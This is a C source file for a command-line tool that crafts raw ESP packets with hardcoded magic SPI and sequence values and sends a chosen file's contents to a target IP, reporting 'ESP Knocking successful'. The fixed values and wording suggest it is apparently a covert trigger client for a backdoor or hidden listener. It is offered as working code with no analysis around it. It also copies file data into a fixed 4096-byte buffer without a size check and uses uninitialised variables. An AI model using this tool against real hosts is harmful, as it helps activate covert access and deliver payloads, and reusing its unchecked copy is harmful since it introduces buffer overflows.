#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <sys/stat.h>

#define TARGET_SPI 0x48dcd78c
#define TARGET_SEQ 0xae574ada

unsigned short checksum(unsigned short *ptr, int nbytes){
	register long sum = 0;
	unsigned short oddbyte;
	register short answer;

	while (nbytes > 1){
		sum += *ptr++;
		nbytes -= 2;
	}

	if (nbytes == 1){
		oddbyte = 0;
		*((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return answer;
}

ssize_t fill_data(char *data, char *filename){
	struct stat st;
	FILE *f = fopen(filename, "rb");
	stat(filename, &st);
	fread(data, st.st_size, 1, f);
	fclose(f);
	return st.st_size;
}

int send_esp_packet(char *ip, char *port, char *filename){
	int server, ret, data_size;
	char packet[4096], *data;
	struct iphdr *iph;
	struct ip_esp_hdr *esph;
	struct sockaddr_in sin;

	memset(packet, 0, 4096);
	iph = (struct iphdr *) packet;
	esph = (struct ip_esp_hdr *) (packet + sizeof(struct iphdr));
	data = packet + sizeof(struct iphdr) + sizeof(struct ip_esp_hdr) + 3;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(atoi(port));
	sin.sin_addr.s_addr = inet_addr(ip);

	server = socket(AF_INET, SOCK_RAW, IPPROTO_ESP);
	if(server < 0){
		perror("socket");
		return -1;
	}

	esph->spi = TARGET_SPI;
	esph->seq_no = TARGET_SEQ;
	data_size = fill_data(esph->enc_data, filename);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct ip_esp_hdr) + data_size;
	iph->id = htonl(4311);
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_ESP;
	iph->check = 0;
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = checksum((unsigned short *)packet, iph->tot_len);

	if (setsockopt (server, IPPROTO_IP, IP_HDRINCL, (int[]){1}, sizeof(int)) < 0){
		perror("setsockopt");
		return -1;
	}

	ret = sendto(server, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
	if (ret >= 0){
		printf("[+] ESP Knocking successful!\n");
	} else {
		perror("sendto");
		return -1;
	}

	return 0;
}

int main(int argc, char **argv){
	int opt, ret;
	char *ip, *port, *filename;

	if (argc < 4){
		printf("Usage: %s -i [ip] -p [port] -f [filename]\n", argv[0]);
		return -1;
	}

	while ((opt = getopt (argc, argv, "i:p:f:")) != -1){
		switch (opt){
		case 'i':
				ip = optarg; break;
		case 'p':
				port = optarg; break;
		case 'f':
				filename = optarg; break;
		default:
				printf("Usage: %s -i [ip] -p [port] -f [filename]\n", argv[0]);
				return -1;
		}
	}

	if (!ip || !port){
		printf("Usage: %s -i [ip] -p [port] -f [filename]\n", argv[0]);
		return -1;
	}

	ret = send_esp_packet(ip, port, filename);
	if (ret < 0){
		printf("Failed to send ESP packet to %s:%s!\n", ip, port);
		return -1;
	}

	return 0;
}
